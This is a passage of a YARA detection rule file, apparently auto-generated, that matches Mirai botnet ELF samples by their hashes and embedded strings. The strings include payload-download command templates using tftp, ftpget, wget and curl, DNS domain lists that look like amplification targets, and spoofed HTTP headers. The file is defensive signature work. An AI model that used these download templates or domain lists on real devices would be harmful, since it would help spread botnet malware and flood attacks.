      hash14 = "0dadbc901eae614d192c754c52ae2e5205e87b0f6dff7684f012f33721d170c8"
      hash15 = "0dd239f64d3b1661218bcf4886781dd8f8ca634ba110c9dab7adaa03434e7a08"
      hash16 = "0eeb92ea59e4a1d7cca7fe8a2e822ecb3ad1b2e5d42798a861bc3b64bea1e533"
      hash17 = "101ceae544a2d5dc9bdcf897eb90a5d5335132dcd1423ea238402875733fd8dc"
      hash18 = "114183b04e6024c8a6c9f4c30992b7a9fcae3391944c34d825d798acc0daa9e3"
      hash19 = "13769e69c4232fd780afa01e93bfe36a4fba02120ff6403def9718c638441b88"
      hash20 = "13e370ad7dd736419e96e5b8c8ab0321a8f44b0418e63c318257bc492cb9c841"
      hash21 = "144040da9bfbf8f6adb89bb3286f6b496149000d31b6b1a8a146b1ffb64ebbbf"
      hash22 = "14a443499f08a57b8833e1824f66568a68f0d518f266033c3130e24cfad809f9"
      hash23 = "15a7975e5642dbdd4abdb01341b46c9f3ce15469932f5249bd0ef64f8a64a63d"
      hash24 = "16a75c55b04c87b7d82aa8f8253fbdb7e45a49dfebb74852f2fb8f42a7548f42"
      hash25 = "16dc0fdff0a4c3153c7ee3e0d84247ad4bf0534d569b955265d150664afd28fc"
      hash26 = "1765e65558047e0c78d3357701d660f860308ad2479b5865f19ab427cfdc3470"
      hash27 = "1aa3314d436064fad32b552018b5532e1d8ed696fa29e531d3432893f688b070"
      hash28 = "1b9e2c13f4012fae670c512313bfa25ec335072ea281b407cc5b82efb9ae1f86"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__06b6f527_Mirai_signature__1266921b_72 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_06b6f527.elf, Mirai(signature)_1266921b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash2 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
   strings:
      $s1 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '24.00'*/
      $s2 = "live.com" fullword ascii /* score: '21.00'*/
      $s3 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s4 = "omany.ultradns-geo.organy.edgecastcdn.netlarge.spf.trusteddomain.orgdkim20._domainkey.godaddy.comtxt.awsdns-hostedzone-info.coma" ascii /* score: '21.00'*/
      $s5 = "youtube.com" fullword ascii /* score: '21.00'*/
      $s6 = "cloudflare.com" fullword ascii /* score: '21.00'*/
      $s7 = "ns.bizdnssec.ripe.netdnssec-failed.orgroot-dnssec.netlarge-dns.akamai.comdns-bigresponse.cloudns.netlarge.txt.research.umbrella." ascii /* score: '20.00'*/
      $s8 = "dnssec-root.iana.orgk.root-servers.netdnssec-failover.cloudflare.comany.dns.oracle.comany.dns.akamai-edge.netany.microsoft-dns.c" ascii /* score: '20.00'*/
      $s9 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns-00.organy.cloudflare-dnssec.netany.ultrad" ascii /* score: '19.00'*/
      $s10 = "dns-bigresponse.cloudns.netlarge.txt.research.umbrella.com" fullword ascii /* score: '18.00'*/
      $s11 = "combigtxt.dns-oarc.netipv6.ripe.netaaaa.nasa.govipv6.google.comipv6.research.ix.ruipv6.6bone.netroot-servers.netdnssec.icann.org" ascii /* score: '16.00'*/
      $s12 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '10.00'*/
      $s13 = "nasa.gov" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00c1ea4d_Mirai_signature__01cb158d_Mirai_signature__06b6f527_Mirai_signature__0b7b7321_Mirai_signature__0d_73 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0b7b7321.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_1266921b.elf, Mirai(signature)_1368463f.elf, Mirai(signature)_13af32d8.elf, Mirai(signature)_1781c186.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash2 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash3 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash4 = "0b7b732129985b5071190ca43f24c3a9609aded4cc76f9c4950374e650184174"
      hash5 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash6 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
      hash7 = "1368463ff5e905ed9ce63ed978d1ff6a03ff1ac373ac1ddca21dec9f8b3330ac"
      hash8 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
      hash9 = "1781c1863810ca199f767491dcb715de7cb52c370bbce958641144b03e767d95"
   strings:
      $s1 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.google.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.twitter.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.linkedin.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.amazon.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.facebook.com/" fullword ascii /* score: '17.00'*/
      $s10 = "X-Forwarded-Proto: https" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( all of them )
      ) or ( all of them )
}

